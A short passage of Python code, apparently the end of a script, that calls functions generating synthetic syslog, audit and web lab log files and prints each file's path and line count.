    path = generate_lab(out)
    print(f"Lab log written to: {path}  ({len(path.read_text().splitlines())} lines)")
    for fn, name in [(generate_syslog_lab, 'syslog'), (generate_audit_lab, 'audit'), (generate_web_lab, 'web')]:
        p = fn()
        print(f"{name} lab log: {p}  ({len(p.read_text().splitlines())} lines)")
